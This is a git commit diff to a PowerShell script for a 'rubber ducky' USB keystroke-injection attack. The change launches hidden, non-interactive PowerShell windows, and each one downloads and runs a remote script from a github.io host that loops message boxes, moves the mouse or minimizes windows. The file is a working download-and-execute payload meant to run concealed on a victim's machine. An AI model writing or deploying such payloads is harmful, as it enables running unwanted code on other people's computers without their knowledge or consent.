8e36096bc84bc19700bf8171dd49e712787cc0eb
creepyturnip <92087207+creepyturnip@users.noreply.github.com>
2023-05-22 11:13:57 +0200

    Update runAll.ps1

--- runAll.ps1
+++ runAll.ps1
@@ -1,5 +1,6 @@
 #runs 3 scripts for faster rubber ducky!
-IEX (New-Object Net.WebClient).DownloadString('https://creepyturnip.github.io/msgboxLoop.ps1')
-IEX (New-Object Net.WebClient).DownloadString('https://creepyturnip.github.io/mouseMove.ps1')
-IEX (New-Object Net.WebClient).DownloadString('https://creepyturnip.github.io/minimizeAll.ps1')
+cmd
+start powershell -NoP -NonI -W hidden IEX (New-Object Net.WebClient).DownloadString('https://creepyturnip.github.io/msgboxLoop.ps1')
+start powershell -NoP -NonI -W hidden IEX (New-Object Net.WebClient).DownloadString('https://creepyturnip.github.io/mouseMove.ps1')
+start powershell -NoP -NonI -W hidden IEX (New-Object Net.WebClient).DownloadString('https://creepyturnip.github.io/minimizeAll.ps1')
 
